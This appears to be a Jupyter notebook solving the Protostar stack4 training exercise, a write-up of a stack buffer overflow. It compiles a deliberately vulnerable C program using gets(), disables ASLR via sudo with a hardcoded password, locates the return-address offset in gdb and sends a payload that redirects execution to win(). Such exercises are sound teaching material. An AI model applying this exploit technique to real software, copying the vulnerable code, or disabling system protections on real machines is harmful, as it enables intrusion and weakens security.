{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "13c10c12",
   "metadata": {},
   "source": [
    "# protostar/stack4 solution\n",
    "\n",
    "https://exploit.education/protostar/stack-four/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e19c27a8",
   "metadata": {},
   "source": [
    "## compile source code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "568dd7b5",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/usr/bin/ld: /tmp/ccDpycFA.o: in function `main':\n",
      "src.c:(.text+0x4d): warning: the `gets' function is dangerous and should not be used.\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "src = r\"\"\"\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "void win()\n",
    "{\n",
    "  printf(\"code flow successfully changed\\n\");\n",
    "  fflush(stdout); // patch to allow redirect output (to notebook) to receive prints with seg faults.\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "  char buffer[64];\n",
    "  \n",
    "  gets(buffer);\n",
    "}\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "with open(\"src.c\", \"w\") as f:\n",
    "    f.write(src)\n",
    "\n",
    "# 32bit. disable warnings. disable stack protection. Align stack to DWORDs.\n",
    "_ = os.system('gcc src.c -m32 -w -fno-stack-protector -mpreferred-stack-boundary=2 -o prog') "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f905ff2",
   "metadata": {},
   "source": [
    "## solution\n",
    "\n",
    "First, we have to find the virtual address of win() function. We can achieve it using gbd.\n",
    "\n",
    "Note that ASLR must be disabled before invoking the application."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "bbf2b5e4",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\n",
      "\"win\" is at 0x56556211\n"
     ]
    }
   ],
   "source": [
    "# Gain root privileges for Kali Linux & Disable ASLR.\n",
    "import os\n",
    "_ = os.system('''\n",
    "echo \"kali\" | sudo -S -i\n",
    "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n",
    "''')\n",
    "\n",
    "# win() virtual address without ASLR.\n",
    "_ = os.system(\"gdb -batch -ex 'file prog' -ex 'run' -ex 'info address win' | egrep -o '\\\"win\\\".*0x[0-9abcdefABCDEF]{4,8}'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d3f8e62",
   "metadata": {},
   "source": [
    "Passing argument string with length > 64 will cause a buffer overflow.  We need to find the location of saved ret address of main and fill it with the virtual address of win() as found above.\n",
    "\n",
    "Let's disassemble main function:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "da01d40d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[Inferior 1 (process 29488) exited normally]\n",
      "Dump of assembler code for function main:\n",
      "   0x56556246 <+0>:\tpush   ebp\n",
      "   0x56556247 <+1>:\tmov    ebp,esp\n",
      "   0x56556249 <+3>:\tpush   ebx\n",
      "   0x5655624a <+4>:\tsub    esp,0x40\n",
      "   0x5655624d <+7>:\tcall   0x5655626f <__x86.get_pc_thunk.ax>\n",
      "   0x56556252 <+12>:\tadd    eax,0x2dae\n",
      "   0x56556257 <+17>:\tlea    edx,[ebp-0x44]\n",
      "   0x5655625a <+20>:\tpush   edx\n",
      "   0x5655625b <+21>:\tmov    ebx,eax\n",
      "   0x5655625d <+23>:\tcall   0x56556050 <gets@plt>\n",
      "   0x56556262 <+28>:\tadd    esp,0x4\n",
      "   0x56556265 <+31>:\tmov    eax,0x0\n",
      "   0x5655626a <+36>:\tmov    ebx,DWORD PTR [ebp-0x4]\n",
      "   0x5655626d <+39>:\tleave  \n",
      "   0x5655626e <+40>:\tret    \n",
      "End of assembler dump.\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "_ = os.system(\"gdb -batch -ex 'file prog' -ex 'run' -ex 'set disassembly-flavor intel' -ex 'disassemble main'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c06f44a2",
   "metadata": {},
   "source": [
    "We can note that 0x40 (64) bytes are reserved on the stack for local params (`sub esp,0x40`) which is our buffer.\n",
    "\n",
    "If we put a breakpoint after `lea edx,[ebp-0x44]` at `0x5655625a` we will find the the buffer's address on the stack. In the same run, the next breakpoint would be at `ret` command. This will allow us to see how many bytes we need to override from the buffer to the return address."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "e85309c8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Breakpoint 1 at 0x5655625d\n",
      "Breakpoint 2 at 0x5655626e\n",
      "\n",
      "Breakpoint 1, 0x5655625d in main ()\n",
      "edx            0xffffd614          -10732\n",
      "\n",
      "Breakpoint 2, 0x5655626e in main ()\n",
      "esp            0xffffd65c          0xffffd65c\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "#_ = os.system(\"gdb -batch -ex 'file prog' -ex 'b *0x5655626e' -ex 'run' -ex 'x/120x $sp-100'\")\n",
    "_ = os.system(\" \\\n",
    "gdb -batch -ex 'file prog' -ex 'b *0x5655625d' -ex 'b *0x5655626e'  -ex 'run' -ex 'info registers edx' \\\n",
    "-ex 'c' -ex 'info registers esp' \\\n",
    "\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d910f023",
   "metadata": {},
   "source": [
    "We can see that the offset between the value in `esp` and the value in `edx` is 0x48 (72) bytes. This means that we have to fill 72 - 64 = 8 bytes before we write our return address."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ec0e683a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "code flow successfully changed\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import subprocess\n",
    "from subprocess import PIPE\n",
    "import struct\n",
    "\n",
    "p = subprocess.Popen(['./prog'], stdin=PIPE, stdout=PIPE)\n",
    "res, err = p.communicate( b'A'*64 + b'B'*8 + struct.pack(\"<I\", 0x56556211) )\n",
    "print(res.decode(\"utf-8\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "0525e619",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# Gain root privileges for Kali Linux & RE-Enable ASLR.\n",
    "import os\n",
    "_ = os.system('''\n",
    "echo \"kali\" | sudo -S -i\n",
    "echo 2 | sudo tee /proc/sys/kernel/randomize_va_space\n",
    "''')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "2146293d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Python version\n",
      "3.9.10 (main, Jan 16 2022, 17:12:18) \n",
      "[GCC 11.2.0]\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "print(\"Python version\")\n",
    "print (sys.version)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9958c182",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
